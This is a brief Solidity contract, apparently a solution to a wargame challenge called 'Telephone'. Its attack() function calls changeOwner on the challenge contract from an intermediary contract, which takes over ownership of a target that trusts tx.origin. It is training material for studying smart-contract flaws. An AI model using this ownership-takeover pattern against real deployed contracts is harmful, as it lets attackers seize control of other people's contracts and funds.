// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {

    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }


    function attack(address addy_) external {

        challenge.changeOwner(addy_);

    }

   
}